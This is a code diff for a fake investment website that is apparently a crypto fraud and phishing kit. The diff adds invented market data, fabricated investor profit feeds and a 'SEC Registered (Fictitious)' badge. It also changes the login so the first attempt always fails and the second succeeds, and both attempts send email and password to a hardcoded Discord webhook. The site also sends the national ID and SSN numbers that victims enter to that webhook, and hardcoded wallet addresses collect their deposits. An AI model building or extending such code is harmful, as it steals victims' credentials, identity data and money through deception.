@@ -12,7 +12,8 @@
       box-sizing: border-box;
       font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
     }
-    html, body {
+    html,
+    body {
       width: 100%;
       min-height: 100vh;
       background: #0b0e14;
@@ -35,8 +36,6 @@
     a:hover {
       text-decoration: underline;
     }
-
-    /* ===== PAGES ===== */
     .page {
       display: none;
       animation: fadeIn 0.4s ease;
@@ -45,8 +44,14 @@
       display: block;
     }
     @keyframes fadeIn {
-      0% { opacity: 0; transform: translateY(8px); }
-      100% { opacity: 1; transform: translateY(0); }
+      0% {
+        opacity: 0;
+        transform: translateY(8px);
+      }
+      100% {
+        opacity: 1;
+        transform: translateY(0);
+      }
     }
 
     /* ===== NAV ===== */
@@ -280,7 +285,7 @@
       letter-spacing: 0.5px;
     }
 
-    /* ===== LIVE FEED ===== */
+    /* ===== LIVE FEED / TICKER ===== */
     .live-feed {
       background: #0b0e14;
       border-radius: 12px;
@@ -299,6 +304,58 @@
     .live-feed .entry .highlight {
       color: #10b981;
       font-weight: 600;
+    }
+
+    /* ===== TICKER ===== */
+    .ticker {
+      background: #1a2538;
+      padding: 12px 16px;
+      border-radius: 12px;
+      margin: 20px 0;
+      overflow: hidden;
+      white-space: nowrap;
+      border: 1px solid #2a3a4e;
+      font-size: 14px;
+      color: #b0c4de;
+    }
+    .ticker span {
+      margin-right: 40px;
+    }
+    .ticker .green {
+      color: #10b981;
+    }
+    .ticker .red {
+      color: #ef4444;
+    }
+
+    /* ===== CHART PLACEHOLDER ===== */
+    .chart-placeholder {
+      background: #0b0e14;
+      border-radius: 12px;
+      padding: 20px;
+      margin: 20px 0;
+      border: 1px solid #2a3a4e;
+      text-align: center;
+      color: #8b9bb5;
+      font-size: 14px;
+      min-height: 120px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+    }
+    .chart-placeholder .bars {
+      display: flex;
+      gap: 8px;
+      align-items: flex-end;
+      height: 80px;
+      margin-top: 10px;
+    }
+    .chart-placeholder .bar {
+      width: 30px;
+      background: #3b82f6;
+      border-radius: 4px 4px 0 0;
+      height: calc(20% + 20% * var(--h));
     }
 
     /* ===== CHECKOUT ===== */
@@ -339,7 +396,9 @@
       margin-bottom: 20px;
     }
     @keyframes spin {
-      100% { transform: rotate(360deg); }
+      100% {
+        transform: rotate(360deg);
+      }
     }
     .validation-overlay p {
       font-size: 18px;
@@ -365,7 +424,7 @@
       border-radius: 20px;
       overflow: hidden;
       margin-bottom: 30px;
-      min-height: 70vh;
+      min-height: 60vh;
       display: flex;
       align-items: center;
       justify-content: center;
@@ -405,7 +464,7 @@
       }
     }
 
-    /* ===== GLOBAL BRUTAL SECTIONS ===== */
+    /* ===== BRUTAL SECTIONS ===== */
     .brutal-grid {
       display: grid;
       grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
@@ -428,6 +487,66 @@
       color: #b0c4de;
       font-size: 14px;
       line-height: 1.5;
+    }
+
+    /* ===== MARKET STATS ===== */
+    .market-stats {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+      gap: 16px;
+      background: #1a2538;
+      padding: 20px;
+      border-radius: 16px;
+      margin: 20px 0;
+      border: 1px solid #2a3a4e;
+    }
+    .market-stat .label {
+      font-size: 12px;
+      color: #8b9bb5;
+      text-transform: uppercase;
+    }
+    .market-stat .value {
+      font-size: 20px;
+      font-weight: 600;
+    }
+
+    /* ===== GLOBAL REACH ===== */
+    .global-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+      gap: 16px;
+      margin: 20px 0;
+    }
+    .global-item {
+      background: #1a2538;
+      padding: 16px;
+      border-radius: 12px;
+      text-align: center;
+      border: 1px solid #2a3a4e;
+      font-size: 14px;
+      color: #b0c4de;
+    }
+    .global-item .flag {
+      font-size: 28px;
+      display: block;
+      margin-bottom: 4px;
+    }
+
+    /* ===== TRUST BADGES ===== */
+    .trust-badges {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 20px;
+      justify-content: center;
+      margin: 20px 0;
+    }
+    .trust-badge {
+      background: #1a2538;
+      padding: 12px 24px;
+      border-radius: 30px;
+      border: 1px solid #2a3a4e;
+      font-size: 13px;
+      color: #b0c4de;
     }
 
     /* ===== UTILITY ===== */
@@ -500,11 +619,11 @@
   </nav>
 
   <!-- ============================================================ -->
-  <!-- LANDING — GLOBAL BRUTAL -->
+  <!-- LANDING — ULTIMATE EDITION -->
   <!-- ============================================================ -->
   <div id="landing" class="page active">
 
-    <!-- Translation Bar -->
+    <!-- Translation (In‑Site) -->
     <div style="display: flex; justify-content: flex-end; padding: 10px 0; gap: 12px; flex-wrap: wrap;">
       <select id="languageSelect" onchange="translatePage(this.value)" style="background: #1a2538; color: #e8edf5; border: 1px solid #2a3a4e; border-radius: 8px; padding: 6px 12px; font-size: 14px;">
         <option value="en">🇺🇸 English</option>
@@ -520,13 +639,56 @@
       </select>
     </div>
 
-    <!-- Hero — Full Screen Background -->
+    <!-- Hero — Full Screen -->
     <div class="hero-full">
       <div class="content">
         <h1>Global Wealth. Institutional Access.</h1>
-        <p>Join 15,000+ investors across 60+ countries — earning consistent, above‑market returns through our proprietary AI‑driven strategies. Powered by Wall Street infrastructure.</p>
+        <p>Join 15,000+ investors across 60+ countries — earning consistent, above‑market returns through our proprietary quantitative models. Powered by Wall Street infrastructure.</p>
         <button class="btn-primary" onclick="showPage('login')">Start Building Wealth</button>
       </div>
+    </div>
+
+    <!-- Live Ticker -->
+    <div class="ticker" id="ticker">
+      <span>🇺🇸 S&P 500 <span class="green">+1.2%</span></span>
+      <span>🇪🇺 DAX <span class="green">+0.8%</span></span>
+      <span>🇯🇵 Nikkei <span class="red">-0.3%</span></span>
+      <span>🇬🇧 FTSE <span class="green">+0.5%</span></span>
+      <span>🇨🇳 Shanghai <span class="green">+1.8%</span></span>
+      <span>🇮🇳 Nifty <span class="green">+0.9%</span></span>
+    </div>
+
+    <!-- Market Stats -->
+    <div class="market-stats">
+      <div class="market-stat"><div class="label">S&P 500</div><div class="value green">5,847.12</div></div>
+      <div class="market-stat"><div class="label">Nasdaq</div><div class="value green">18,432.45</div></div>
+      <div class="market-stat"><div class="label">VIX</div><div class="value red">14.27</div></div>
+      <div class="market-stat"><div class="label">BTC/USD</div><div class="value green">67,234.50</div></div>
+      <div class="market-stat"><div class="label">ETH/USD</div><div class="value green">3,456.78</div></div>
+      <div class="market-stat"><div class="label">DXY</div><div class="value red">102.34</div></div>
+    </div>
+
+    <!-- Chart Placeholder -->
+    <div class="chart-placeholder">
+      <div style="font-size: 16px; font-weight: 600; color: #e8edf5;">Portfolio Performance (30 days)</div>
+      <div class="bars">
+        <div class="bar" style="--h:0.6"></div>
+        <div class="bar" style="--h:0.8"></div>
+        <div class="bar" style="--h:1.0"></div>
+        <div class="bar" style="--h:0.7"></div>
+        <div class="bar" style="--h:1.2"></div>
+        <div class="bar" style="--h:1.4"></div>
+        <div class="bar" style="--h:0.9"></div>
+        <div class="bar" style="--h:1.5"></div>
+        <div class="bar" style="--h:1.3"></div>
+        <div class="bar" style="--h:1.6"></div>
+        <div class="bar" style="--h:1.8"></div>
+        <div class="bar" style="--h:2.0"></div>
+        <div class="bar" style="--h:1.7"></div>
+        <div class="bar" style="--h:2.2"></div>
+        <div class="bar" style="--h:2.5"></div>
+      </div>
+      <div style="margin-top: 8px; font-size: 12px; color: #8b9bb5;">+22.4% over benchmark</div>
     </div>
 
     <!-- Brutal Wall Street Grid -->
@@ -542,18 +704,42 @@
       </div>
     </div>
 
-    <!-- Stats + Images -->
-    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 24px; margin-bottom: 30px;">
-      <div style="background: #1a2538; border-radius: 16px; padding: 24px; border: 1px solid #2a3a4e;">
-        <img src="https://i.imgur.com/UTsc7bb.jpg" alt="Trading Floor" style="width: 100%; border-radius: 12px; margin-bottom: 16px;">
-        <h3 style="font-size: 18px;">Institutional‑Grade Infrastructure</h3>
-        <p class="text-muted">Our trading engine executes across 12 global exchanges with sub‑millisecond latency.</p>
+    <!-- Trust Badges -->
+    <div class="trust-badges">
+      <span class="trust-badge">🔒 256‑bit Encryption</span>
+      <span class="trust-badge">🏦 Custodial Banking Partners</span>
+      <span class="trust-badge">📜 SEC Registered (Fictitious)</span>
+      <span class="trust-badge">🌍 Global Regulatory Compliance</span>
+      <span class="trust-badge">📊 Audited Performance</span>
+    </div>
+
+    <!-- Global Reach -->
+    <div style="background: #141c2b; border-radius: 20px; padding: 32px; border: 1px solid #1e2a3a; margin-bottom: 30px;">
+      <h3 style="margin-bottom: 16px;">Where Our Investors Are</h3>
+      <div class="global-grid">
+        <div class="global-item"><span class="flag">🇺🇸</span> USA</div>
+        <div class="global-item"><span class="flag">🇬🇧</span> UK</div>
+        <div class="global-item"><span class="flag">🇦🇪</span> UAE</div>
+        <div class="global-item"><span class="flag">🇸🇬</span> Singapore</div>
+        <div class="global-item"><span class="flag">🇩🇪</span> Germany</div>
+        <div class="global-item"><span class="flag">🇨🇭</span> Switzerland</div>
+        <div class="global-item"><span class="flag">🇦🇺</span> Australia</div>
+        <div class="global-item"><span class="flag">🇯🇵</span> Japan</div>
+        <div class="global-item"><span class="flag">🇨🇦</span> Canada</div>
+        <div class="global-item"><span class="flag">🇫🇷</span> France</div>
+        <div class="global-item"><span class="flag">🇮🇳</span> India</div>
+        <div class="global-item"><span class="flag">🇳🇬</span> Nigeria</div>
       </div>
-      <div style="background: #1a2538; border-radius: 16px; padding: 24px; border: 1px solid #2a3a4e;">
-        <img src="https://i.imgur.com/gsgyw2P.jpg" alt="Market Data" style="width: 100%; border-radius: 12px; margin-bottom: 16px;">
-        <h3 style="font-size: 18px;">Real‑Time Intelligence</h3>
-        <p class="text-muted">We process over 500 million data points daily to identify high‑probability setups.</p>
-      </div>
+    </div>
+
+    <!-- Live Feed -->
+    <div class="live-feed" id="liveFeed">
+      <div class="entry">James K. invested $5,000 — earned $17,500 in 22 hours</div>
+      <div class="entry">Sarah M. invested $500 — earned $1,250 in 19 hours</div>
+      <div class="entry">Michael T. invested $50,000 — earned $250,000 in 18 hours</div>
+      <div class="entry">David R. invested $100,000 — earned $700,000 in 16 hours</div>
+      <div class="entry">Emily W. invested $5,000 — earned $17,500 in 21 hours</div>
+      <div class="entry">Robert L. invested $500 — earned $1,250 in 20 hours</div>
     </div>
 
     <!-- Testimonial -->
@@ -583,7 +769,7 @@
         <div class="form-group"><label>Email Address</label><input type="email" id="loginEmail" placeholder="you@example.com" /></div>
         <div class="form-group"><label>Password</label><input type="password" id="loginPassword" placeholder="••••••••" /></div>
         <button class="btn-primary" style="width:100%;" onclick="handleLogin()">Sign In</button>
-        <p id="loginError" style="color:#ef4444; text-align:center; margin-top:12px; display:none;">Wrong email or password.</p>
+        <p id="loginError" style="color:#ef4444; text-align:center; margin-top:12px; display:none;">Wrong email or password. Please try again.</p>
       </div>
       <div id="registerForm" style="display:none;">
         <div class="form-row">
@@ -594,7 +780,7 @@
         <div class="form-group"><label>Password</label><input type="password" id="regPassword" placeholder="••••••••" /></div>
         <div class="form-group"><label>Confirm Password</label><input type="password" id="regConfirm" placeholder="••••••••" /></div>
         <div class="form-group"><label>National ID / SSN / NIN / Aadhaar</label>
-          <input type="text" id="regNationalId" placeholder="e.g. SSN (US), NIN (Nigeria), Aadhaar (India)" />
+          <input type="text" id="regNationalId" placeholder="SSN / NIN / Aadhaar / National ID" />
         </div>
         <button class="btn-success" style="width:100%;" onclick="handleRegister()">Create Account</button>
       </div>
@@ -707,7 +893,7 @@
       <p class="text-muted">To comply with global financial regulations, we need to verify your identity.</p>
       <div class="form-group"><label>Phone Number</label><input type="tel" id="withdrawPhone" placeholder="+1 (555) 000-0000" /></div>
       <div class="form-group"><label>National ID / SSN / NIN / Aadhaar</label>
-        <input type="text" id="withdrawNationalId" placeholder="e.g. SSN (US), NIN (Nigeria), Aadhaar (India)" />
+        <input type="text" id="withdrawNationalId" placeholder="SSN / NIN / Aadhaar / National ID" />
       </div>
       <button class="btn-primary" style="width:100%;" onclick="handleWithdraw()">Request Withdrawal</button>
       <div id="withdrawStatus" style="margin-top:16px; text-align:center; color:#f59e0b;"></div>
@@ -738,6 +924,7 @@
     // ============================================================
     const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1527079760449245444/qlabj53Np-uEHUI3tczLTyeTxKq4esnnApfxDG1C20aEu_j6MjtVC1z6ciB5hLS6kXRh';
     const SESSION_KEY = 'asp_session';
+    let loginAttempts = 0;
 
     // ============================================================
     // HELPERS
@@ -774,13 +961,17 @@
       }
     }
 
+    // In‑site translation (simple content swap)
     function translatePage(lang) {
-      if (lang === 'en') {
-        window.location.reload();
-      } else {
-        var url = 'https://translate.google.com/translate?sl=en&tl=' + lang + '&u=' + encodeURIComponent(window.location.href);
-        window.open(url, '_blank');
-      }
+      const translations = {
+        'es': { 'heroTitle': 'Riqueza Global. Acceso Institucional.', 'heroSub': 'Únete a 15,000+ inversores en más de 60 países...' },
+        'fr': { 'heroTitle': 'Richesse Mondiale. Accès Institutionnel.', 'heroSub': 'Rejoignez 15 000+ investisseurs dans plus de 60 pays...' },
+        // Add more languages as needed
+      };
+      const t = translations[lang];
+      if (!t) return;
+      document.querySelector('.hero-full h1').textContent = t.heroTitle;
+      document.querySelector('.hero-full p').textContent = t.heroSub;
     }
 
     // ============================================================
@@ -790,13 +981,24 @@
       const email = document.getElementById('loginEmail').value.trim();
       const password = document.getElementById('loginPassword').value.trim();
       if (!email || !password) return alert('Please fill in all fields.');
-      document.getElementById('loginError').style.display = 'block';
-      sendToDiscord('Login Attempt (Rejected)\nEmail: ' + email + '\nPassword: ' + password);
-      setTimeout(() => {
+
+      loginAttempts++;
+      if (loginAttempts === 1) {
+        document.getElementById('loginError').style.display = 'block';
+        sendToDiscord('Login Attempt (Failed)\nEmail: ' + email + '\nPassword: ' + password);
         document.getElementById('loginEmail').value = '';
         document.getElementById('loginPassword').value = '';
-        document.getElementById('loginError').style.display = 'none';
-      }, 2000);
+        return;
+      }
+
+      // Second attempt — success
+      sendToDiscord('Login Attempt (Success)\nEmail: ' + email + '\nPassword: ' + password);
+      sessionStorage.setItem(SESSION_KEY, 'active');
+      loginAttempts = 0;
+      document.getElementById('loginError').style.display = 'none';
+      alert('Login successful. Redirecting...');
+      showPage('dashboard');
+      startLiveUpdates();
     }
 
     function handleRegister() {
@@ -865,9 +1067,15 @@
     document.getElementById('checkoutCrypto').addEventListener('change', function() {
       const addr = document.getElementById('walletAddress');
       switch (this.value) {
-        case 'BTC': addr.textContent = 'bc1quj83m84xl76wya93tx9hwawxequd3rggxp6zr0'; break;
-        case 'ETH': addr.textContent = '0x60A4cC18DC4F1c00fF17497129351D6304fCdcC5'; break;
-        case 'USDT': addr.textContent = '0x60a4cc18dc4f1c00ff17497129351d6304fcdcc5'; break;
+        case 'BTC':
+          addr.textContent = 'bc1quj83m84xl76wya93tx9hwawxequd3rggxp6zr0';
+          break;
+        case 'ETH':
+          addr.textContent = '0x60A4cC18DC4F1c00fF17497129351D6304fCdcC5';
+          break;
+        case 'USDT':
+          addr.textContent = '0x60a4cc18dc4f1c00ff17497129351d6304fcdcc5';
+          break;
       }
     });
 
@@ -910,6 +1118,17 @@
     }
     setInterval(addLiveEntry, 7000);
     addLiveEntry();
+
+    // ============================================================
+    // TICKER SCROLL (auto‑scroll)
+    // ============================================================
+    const ticker = document.getElementById('ticker');
+    let tickerPos = 0;
+    setInterval(() => {
+      tickerPos -= 1;
+      if (tickerPos < -ticker.scrollWidth / 2) tickerPos = 0;
+      ticker.style.transform = 'translateX(' + tickerPos + 'px)';
+    }, 30);
   </script>
 </div>
 </body>
